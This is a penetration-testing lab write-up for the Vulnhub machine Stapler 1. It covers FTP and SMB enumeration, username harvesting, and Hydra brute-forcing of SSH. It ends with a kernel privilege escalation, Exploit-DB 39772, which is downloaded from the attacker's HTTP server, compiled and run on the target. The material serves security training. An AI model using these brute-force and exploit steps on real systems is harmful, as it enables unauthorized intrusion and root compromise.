# OSCP Vulnhub Set 1 - Stapler 1

Lab link: http://ccmtlab.ccmt.home.arpa:8888/user/missions/boxes?uuid=998d18fb-ddae-43c5-9515-583205736776

Target IP: 10.101.85.17

---

## Scanning and Enumeration

### Nmap

Scan all popular ports with OS, version, and script detection.

```
nmap -Pn -A 10.101.85.17
```

Identified an anonymous FTP login vulnerability on port 21 and a raw service hosting a PKZIP archive on port 666.

```
┌──(kali㉿kali)-[~/Desktop/ccmtlab/07]
└─$ nmap -Pn -A 10.101.85.17
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-24 22:50 -0400
Nmap scan report for 10.101.85.17
Host is up (0.0028s latency).
Not shown: 992 filtered tcp ports (no-response)
PORT     STATE  SERVICE     VERSION
20/tcp   closed ftp-data
21/tcp   open   ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 550 Permission denied.
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to 10.101.55.75
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 4
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open   ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 81:21:ce:a1:1a:05:b1:69:4f:4d:ed:80:28:e8:99:05 (RSA)
|   256 5b:a5:bb:67:91:1a:51:c2:d3:21:da:c0:ca:f0:db:9e (ECDSA)
|_  256 6d:01:b7:73:ac:b0:93:6f:fa:b9:89:e6:ae:3c:ab:d3 (ED25519)
53/tcp   open   tcpwrapped
80/tcp   open   http        PHP cli server 5.5 or later
|_http-title: 404 Not Found
139/tcp  open   netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
666/tcp  open   pkzip-file  .ZIP file
| fingerprint-strings: 
|   NULL: 
|     message2.jpgUT 
|     QWux
|     "DL[E
|     #;3[
|     \xf6
|     u([r
|     qYQq
|     Y_?n2
|     3&M~{
|     9-a)T
|     L}AJ
|_    .npy.9
...[snip]...
```

---

### Port 666

Downloaded the ZIP file from port 666 and extracted its contents.

```
wget http://10.101.85.17:666 -O secret.zip
unzip secret.zip
```

The extracted archive contained an image file depicting a terminal screenshot. The image shows an echo command triggering a segmentation fault, strongly hinting at a potential Buffer Overflow vulnerability on the target system.

![](./images/01.png)

---

### FTP

Connected to the FTP server as anonymous to collect data.

```
ftp 10.101.85.17
anonymous
```

Only a single file named note was found in the FTP directory.

```
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Jun 04  2016 .
drwxr-xr-x    2 0        0            4096 Jun 04  2016 ..
-rw-r--r--    1 0        0             107 Jun 03  2016 note
226 Directory send OK.
```

Downloaded the file and viewed its contents on Kali

```
get note
exit
cat note
```

The note reveals a message from John to Elly, instructing her to update payload information and leave it in her FTP account.

```
┌──(kali㉿kali)-[~/Desktop/ccmtlab/07]
└─$ cat note     
Elly, make sure you update the payload information. Leave it in your FTP account once your are done, John.
```

Attempted to connect via SSH to gather more information.

```
ssh 10.101.85.17
```

---

### SSH

The SSH banner revealed another potential username, "barry".

```
┌──(kali㉿kali)-[~/Desktop/ccmtlab/07]
└─$ ssh 10.101.85.17
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
-----------------------------------------------------------------
~          Barry, don't forget to put a message here           ~
-----------------------------------------------------------------
```

---

### Dirsearch

Ran dirsearch to scan for hidden directories and files on the web server.

```
dirsearch -u http://10.101.85.17 -t 50
```

The scan completed quickly and identified three standard Linux configuration files accessible via the web root.

```
┌──(kali㉿kali)-[~/Desktop/ccmtlab/07]
└─$ dirsearch -u http://10.101.85.17 -t 50
/usr/lib/python3/dist-packages/dirsearch/dirsearch.py:23: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  from pkg_resources import DistributionNotFound, VersionConflict

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 50 | Wordlist size: 11460

Output File: /home/kali/Desktop/ccmtlab/07/reports/http_10.101.85.17/_26-05-25_00-17-09.txt

Target: http://10.101.85.17/

[00:17:09] Starting: 
[00:17:09] 200 -  220B  - /.bash_logout                                     
[00:17:10] 200 -    4KB - /.bashrc                                          
[00:17:12] 200 -  675B  - /.profile                                         
                                                                             
Task Completed
```

Downloaded the identified configuration files using wget to inspect their contents locally.

```
wget http://10.101.85.17/.bash_logout
wget http://10.101.85.17/.bashrc
wget http://10.101.85.17/.profile
```

Inspected the contents of .bash_logout, .bashrc, and .profile using cat. No sensitive information, credentials, or custom modifications were found, as all files contained only standard default Linux configurations.

```
┌──(kali㉿kali)-[~/Desktop/ccmtlab/07]
└─$ cat .bash_logout          
# ~/.bash_logout: executed by bash(1) when login shell exits.

# when leaving the console clear the screen to increase privacy

if [ "$SHLVL" = 1 ]; then
    [ -x /usr/bin/clear_console ] && /usr/bin/clear_console -q
fi
                                                                                                                   
┌──(kali㉿kali)-[~/Desktop/ccmtlab/07]
└─$ cat .bashrc     
# ~/.bashrc: executed by bash(1) for non-login shells.
# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
# for examples

# If not running interactively, don't do anything
case $- in
    *i*) ;;
      *) return;;
esac

# don't put duplicate lines or lines starting with space in the history.
# See bash(1) for more options
HISTCONTROL=ignoreboth

# append to the history file, don't overwrite it
shopt -s histappend

# for setting history length see HISTSIZE and HISTFILESIZE in bash(1)
HISTSIZE=1000
HISTFILESIZE=2000

# check the window size after each command and, if necessary,
# update the values of LINES and COLUMNS.
shopt -s checkwinsize

# If set, the pattern "**" used in a pathname expansion context will
# match all files and zero or more directories and subdirectories.
#shopt -s globstar

# make less more friendly for non-text input files, see lesspipe(1)
[ -x /usr/bin/lesspipe ] && eval "$(SHELL=/bin/sh lesspipe)"

# set variable identifying the chroot you work in (used in the prompt below)
if [ -z "${debian_chroot:-}" ] && [ -r /etc/debian_chroot ]; then
    debian_chroot=$(cat /etc/debian_chroot)
fi

# set a fancy prompt (non-color, unless we know we "want" color)
case "$TERM" in
    xterm-color|*-256color) color_prompt=yes;;
esac

# uncomment for a colored prompt, if the terminal has the capability; turned
# off by default to not distract the user: the focus in a terminal window
# should be on the output of commands, not on the prompt
#force_color_prompt=yes

if [ -n "$force_color_prompt" ]; then
    if [ -x /usr/bin/tput ] && tput setaf 1 >&/dev/null; then
        # We have color support; assume it's compliant with Ecma-48
        # (ISO/IEC-6429). (Lack of such support is extremely rare, and such
        # a case would tend to support setf rather than setaf.)
        color_prompt=yes
    else
        color_prompt=
    fi
fi

if [ "$color_prompt" = yes ]; then
    PS1='${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '
else
    PS1='${debian_chroot:+($debian_chroot)}\u@\h:\w\$ '
fi
unset color_prompt force_color_prompt

# If this is an xterm set the title to user@host:dir
case "$TERM" in
xterm*|rxvt*)
    PS1="\[\e]0;${debian_chroot:+($debian_chroot)}\u@\h: \w\a\]$PS1"
    ;;
*)
    ;;
esac

# enable color support of ls and also add handy aliases
if [ -x /usr/bin/dircolors ]; then
    test -r ~/.dircolors && eval "$(dircolors -b ~/.dircolors)" || eval "$(dircolors -b)"
    alias ls='ls --color=auto'
    #alias dir='dir --color=auto'
    #alias vdir='vdir --color=auto'

    alias grep='grep --color=auto'
    alias fgrep='fgrep --color=auto'
    alias egrep='egrep --color=auto'
fi

# colored GCC warnings and errors
#export GCC_COLORS='error=01;31:warning=01;35:note=01;36:caret=01;32:locus=01:quote=01'

# some more ls aliases
alias ll='ls -alF'
alias la='ls -A'
alias l='ls -CF'

# Add an "alert" alias for long running commands.  Use like so:
#   sleep 10; alert
alias alert='notify-send --urgency=low -i "$([ $? = 0 ] && echo terminal || echo error)" "$(history|tail -n1|sed -e '\''s/^\s*[0-9]\+\s*//;s/[;&|]\s*alert$//'\'')"'

# Alias definitions.
# You may want to put all your additions into a separate file like
# ~/.bash_aliases, instead of adding them here directly.
# See /usr/share/doc/bash-doc/examples in the bash-doc package.

if [ -f ~/.bash_aliases ]; then
    . ~/.bash_aliases
fi

# enable programmable completion features (you don't need to enable
# this, if it's already enabled in /etc/bash.bashrc and /etc/profile
# sources /etc/bash.bashrc).
if ! shopt -oq posix; then
  if [ -f /usr/share/bash-completion/bash_completion ]; then
    . /usr/share/bash-completion/bash_completion
  elif [ -f /etc/bash_completion ]; then
    . /etc/bash_completion
  fi
fi
                                                                                                                   
┌──(kali㉿kali)-[~/Desktop/ccmtlab/07]
└─$ cat .profile 
# ~/.profile: executed by the command interpreter for login shells.
# This file is not read by bash(1), if ~/.bash_profile or ~/.bash_login
# exists.
# see /usr/share/doc/bash/examples/startup-files for examples.
# the files are located in the bash-doc package.

# the default umask is set in /etc/profile; for setting the umask
# for ssh logins, install and configure the libpam-umask package.
#umask 022

# if running bash
if [ -n "$BASH_VERSION" ]; then
    # include .bashrc if it exists
    if [ -f "$HOME/.bashrc" ]; then
        . "$HOME/.bashrc"
    fi
fi

# set PATH so it includes user's private bin if it exists
if [ -d "$HOME/bin" ] ; then
    PATH="$HOME/bin:$PATH"
fi
```

---

### SMB

Enumerated the Samba shares on the target to identify accessible network directories.

```
smbclient -L //10.101.85.17 -N
```

The scan listed available shares, revealing a user directory kathy, a temporary folder tmp, and two potential usernames "kathy" and "fred".

```
┌──(kali㉿kali)-[~/Desktop/ccmtlab/07]
└─$ smbclient -L //10.101.85.17 -N

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        kathy           Disk      Fred, What are we doing here?
        tmp             Disk      All temporary files should be stored here
        IPC$            IPC       IPC Service (red server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            KIOPTRIX4
```

Accessed the kathy shared directory anonymously to check for accessible files.

```
smbclient //10.101.85.17/kathy -N
```

The connection was successful without a password. Listing the directory contents revealed two subdirectories named kathy_stuff and backup.

```
┌──(kali㉿kali)-[~/Desktop/ccmtlab/07]
└─$ smbclient //10.101.85.17/kathy -N
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Fri Jun  3 12:52:52 2016
  ..                                  D        0  Mon Jun  6 17:39:56 2016
  kathy_stuff                         D        0  Sun Jun  5 11:02:27 2016
  backup                              D        0  Sun Jun  5 11:04:14 2016
```

Discovered three files across the two subdirectories: todo-list.txt in kathy_stuff, and vsftpd.conf along with wordpress-4.tar.gz in backup.

```
smb: \> cd kathy_stuff
smb: \kathy_stuff\> ls
  .                                   D        0  Sun Jun  5 11:02:27 2016
  ..                                  D        0  Fri Jun  3 12:52:52 2016
  todo-list.txt                       N       64  Sun Jun  5 11:02:27 2016

                19478204 blocks of size 1024. 16014580 blocks available
smb: \kathy_stuff\> cd ..
smb: \> cd backup
smb: \backup\> ls
  .                                   D        0  Sun Jun  5 11:04:14 2016
  ..                                  D        0  Fri Jun  3 12:52:52 2016
  vsftpd.conf                         N     5961  Sun Jun  5 11:03:45 2016
  wordpress-4.tar.gz                  N  6321767  Mon Apr 27 13:14:46 2015
  cd ..
```

Downloaded the identified files from both subdirectories to the local Kali machine for analysis.

```
get \kathy_stuff\todo-list.txt
get \backup\vsftpd.conf
get \backup\wordpress-4.tar.gz
exit
```

Analyzed the contents of todo-list.txt to find sensitive notes or clues.

```
cat '\kathy_stuff\todo-list.txt'
```

The file contained a short note mentioning a backup for "Initech" but did not reveal any credentials.

```
┌──(kali㉿kali)-[~/Desktop/ccmtlab/07]
└─$ cat '\kathy_stuff\todo-list.txt'
I'm making sure to backup anything important for Initech, Kathy
```

Analyzed the vsftpd.conf file to inspect the FTP server configuration.

```
cat '\backup\vsftpd.conf' 
```

The configuration revealed a critical security misconfiguration where the local root directory for FTP users is mapped directly to the system configuration directory /etc.

```
┌──(kali㉿kali)-[~/Desktop/ccmtlab/07]
└─$ cat '\backup\vsftpd.conf' 
# Example config file /etc/vsftpd.conf
...[snip]...
# You may restrict local users to their home directories.  See the FAQ for
# the possible risks in this before using chroot_local_user or
# chroot_list_enable below.
chroot_local_user=YES
userlist_enable=YES
local_root=/etc
...[snip]...
```

Executed enum4linux to perform automated, deep SMB enumeration and targeted user harvesting.

```
enum4linux -a 10.101.85.17 > enum4linux.txt
```

The scan successfully extracted the password policy parameters and enumerated a comprehensive list of valid local Unix system users via RID cycling.

```
┌──(kali㉿kali)-[~/Desktop/ccmtlab/07]
└─$ cat enum4linux.txt       
...[snip]...

[+] Enumerating users using SID S-1-22-1 and logon username '', password ''                                         
                                                                                                                    
S-1-22-1-1000 Unix User\peter (Local User)                                                                          
S-1-22-1-1001 Unix User\RNunemaker (Local User)
S-1-22-1-1002 Unix User\ETollefson (Local User)
S-1-22-1-1003 Unix User\DSwanger (Local User)
S-1-22-1-1004 Unix User\AParnell (Local User)
S-1-22-1-1005 Unix User\SHayslett (Local User)
S-1-22-1-1006 Unix User\MBassin (Local User)
S-1-22-1-1007 Unix User\JBare (Local User)
S-1-22-1-1008 Unix User\LSolum (Local User)
S-1-22-1-1009 Unix User\IChadwick (Local User)
S-1-22-1-1010 Unix User\MFrei (Local User)
S-1-22-1-1011 Unix User\SStroud (Local User)
S-1-22-1-1012 Unix User\CCeaser (Local User)
S-1-22-1-1013 Unix User\JKanode (Local User)
S-1-22-1-1014 Unix User\CJoo (Local User)
S-1-22-1-1015 Unix User\Eeth (Local User)
S-1-22-1-1016 Unix User\LSolum2 (Local User)
S-1-22-1-1017 Unix User\JLipps (Local User)
S-1-22-1-1018 Unix User\jamie (Local User)
S-1-22-1-1019 Unix User\Sam (Local User)
S-1-22-1-1020 Unix User\Drew (Local User)
S-1-22-1-1021 Unix User\jess (Local User)
S-1-22-1-1022 Unix User\SHAY (Local User)
S-1-22-1-1023 Unix User\Taylor (Local User)
S-1-22-1-1024 Unix User\mel (Local User)
S-1-22-1-1025 Unix User\kai (Local User)
S-1-22-1-1026 Unix User\zoe (Local User)
S-1-22-1-1027 Unix User\NATHAN (Local User)
S-1-22-1-1028 Unix User\www (Local User)
S-1-22-1-1029 Unix User\elly (Local User)

 ===============================( Getting printer info for 10.101.85.17 )===============================
                                                                                                                    
No printers returned.                                                                                               


enum4linux complete on Mon May 25 04:57:48 2026
```

Save them as users.txt

```
peter
RNunemaker
ETollefson
DSwanger
AParnell
SHayslett
MBassin
JBare
LSolum
IChadwick
MFrei
SStroud
CCeaser
JKanode
CJoo
Eeth
LSolum2
JLipps
jamie
Sam
Drew
jess
SHAY
Taylor
mel
kai
zoe
NATHAN
www
elly
```

---

## Exploitation

### SSH Brute-forcing

Brute-forced the SSH service using Hydra and the extracted user list.

```
hydra -L users.txt -P users.txt 10.101.85.17 ssh -F
```

The attack successfully discovered valid SSH credentials for the user SHayslett.

```
┌──(kali㉿kali)-[~/Desktop/ccmtlab/07]
└─$ hydra -L users.txt -P users.txt 10.101.85.17 ssh -F
Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-05-25 21:42:03
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 900 login tries (l:30/p:30), ~57 tries per task
[DATA] attacking ssh://10.101.85.17:22/
[22][ssh] host: 10.101.85.17   login: SHayslett   password: SHayslett
[STATUS] attack finished for 10.101.85.17 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-05-25 21:42:54
```

Logged into the target system using the discovered SSH credentials.

```
ssh SHayslett@10.101.85.17
SHayslett
```

---

## Privilege Escalation

### System Enumeration

The system runs an outdated Ubuntu 16.04 kernel and the current user has no sudo privileges.

```
SHayslett@red:~$ uname -a
Linux red.initech 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU/Linux
SHayslett@red:~$ cat /etc/os-release
NAME="Ubuntu"
VERSION="16.04 LTS (Xenial Xerus)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 16.04 LTS"
VERSION_ID="16.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
UBUNTU_CODENAME=xenial
SHayslett@red:~$ sudo -l

We trust you have received the usual lecture from the local System
Administrator. It usually boils down to these three things:

    #1) Respect the privacy of others.
    #2) Think before you type.
    #3) With great power comes great responsibility.

[sudo] password for SHayslett: 
Sorry, user SHayslett may not run sudo on red.
```

Searched for available local privilege escalation exploits matching the target OS.

```
searchsploit "Ubuntu 16.04"
```

The search returned multiple potential kernel exploits targeting Ubuntu 16.04.

```
┌──(kali㉿kali)-[~/Desktop/ccmtlab/07]
└─$ searchsploit "Ubuntu 16.04"
---------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                    |  Path
---------------------------------------------------------------------------------- ---------------------------------
Apport 2.x (Ubuntu Desktop 12.10 < 16.04) - Local Code Execution                  | linux/local/40937.txt
Exim 4 (Debian 8 / Ubuntu 16.04) - Spool Privilege Escalation                     | linux/local/40054.c
Google Chrome (Fedora 25 / Ubuntu 16.04) - 'tracker-extract' / 'gnome-video-thumb | linux/local/40943.txt
LightDM (Ubuntu 16.04/16.10) - 'Guest Account' Local Privilege Escalation         | linux/local/41923.txt
Linux Kernel (Debian 7.7/8.5/9.0 / Ubuntu 14.04.2/16.04.2/17.04 / Fedora 22/25 /  | linux_x86-64/local/42275.c
Linux Kernel (Debian 9/10 / Ubuntu 14.04.5/16.04.2/17.04 / Fedora 23/24/25) - 'ld | linux_x86/local/42276.c
Linux Kernel (Ubuntu 16.04) - Reference Count Overflow Using BPF Maps             | linux/dos/39773.txt
Linux Kernel 4.14.7 (Ubuntu 16.04 / CentOS 7) - (KASLR & SMEP Bypass) Arbitrary F | linux/local/45175.c
Linux Kernel 4.4 (Ubuntu 16.04) - 'BPF' Local Privilege Escalation (Metasploit)   | linux/local/40759.rb
Linux Kernel 4.4 (Ubuntu 16.04) - 'snd_timer_user_ccallback()' Kernel Pointer Lea | linux/dos/46529.c
Linux Kernel 4.4.0 (Ubuntu 14.04/16.04 x86-64) - 'AF_PACKET' Race Condition Privi | linux_x86-64/local/40871.c
Linux Kernel 4.4.0-21 (Ubuntu 16.04 x64) - Netfilter 'target_offset' Out-of-Bound | linux_x86-64/local/40049.c
Linux Kernel 4.4.0-21 < 4.4.0-51 (Ubuntu 14.04/16.04 x64) - 'AF_PACKET' Race Cond | windows_x86-64/local/47170.c
Linux Kernel 4.4.x (Ubuntu 16.04) - 'double-fdput()' bpf(BPF_PROG_LOAD) Privilege | linux/local/39772.txt
Linux Kernel 4.6.2 (Ubuntu 16.04.1) - 'IP6T_SO_SET_REPLACE' Local Privilege Escal | linux/local/40489.txt
Linux Kernel 4.8 (Ubuntu 16.04) - Leak sctp Kernel Pointer                        | linux/dos/45919.c
Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation     | linux/local/45010.c
Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation            | linux/local/44298.c
Linux Kernel < 4.4.0-21 (Ubuntu 16.04 x64) - 'netfilter target_offset' Local Priv | linux_x86-64/local/44300.c
Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escal | linux/local/43418.c
Linux Kernel < 4.4.0/ < 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) - L | linux/local/47169.c
---------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

---

### Exploit 39772

Mirrored the selected exploit script to the local working directory.

```
searchsploit -m linux/local/39772.txt
```

Downloaded the precompiled exploit binaries from the Exploit-DB repository.

```
wget https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/39772.zip
```

Started a temporary HTTP server to host the exploit files for the target machine.

```
python3 -m http.server 80
```

Navigated to the temporary directory on the target system and downloaded the exploit package.

```
cd /tmp
wget http://10.101.55.75/39772.zip
```

Extracted the exploit archive and navigated into the exploit source directory.

```
unzip 39772.zip
cd 39772
tar -xvf exploit.tar
cd ebpf_mapfd_doubleput_exploit/
```

Compiled the exploit source code and executed the binary to trigger the vulnerability.

```
bash compile.sh
./doubleput
```

The exploit successfully achieved pointer reuse and spawned a root shell.

```
SHayslett@red:/tmp/39772$ tar -xvf exploit.tar
ebpf_mapfd_doubleput_exploit/
ebpf_mapfd_doubleput_exploit/hello.c
ebpf_mapfd_doubleput_exploit/suidhelper.c
ebpf_mapfd_doubleput_exploit/compile.sh
ebpf_mapfd_doubleput_exploit/doubleput.c
SHayslett@red:/tmp/39772$ bash compile.sh
bash: compile.sh: No such file or directory
SHayslett@red:/tmp/39772$ ls
crasher.tar  ebpf_mapfd_doubleput_exploit  exploit.tar
SHayslett@red:/tmp/39772$ cd ebpf_mapfd_doubleput_exploit/
SHayslett@red:/tmp/39772/ebpf_mapfd_doubleput_exploit$ bash compile.sh
doubleput.c: In function ‘make_setuid’:
doubleput.c:91:13: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
    .insns = (__aligned_u64) insns,
             ^
doubleput.c:92:15: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
    .license = (__aligned_u64)""
               ^
SHayslett@red:/tmp/39772/ebpf_mapfd_doubleput_exploit$ ./doubleput
starting writev
woohoo, got pointer reuse
writev returned successfully. if this worked, you'll have a root shell in <=60 seconds.
suid file detected, launching rootshell...
we have root privs now...
root@red:/tmp/39772/ebpf_mapfd_doubleput_exploit# id
uid=0(root) gid=0(root) groups=0(root),1005(SHayslett)
```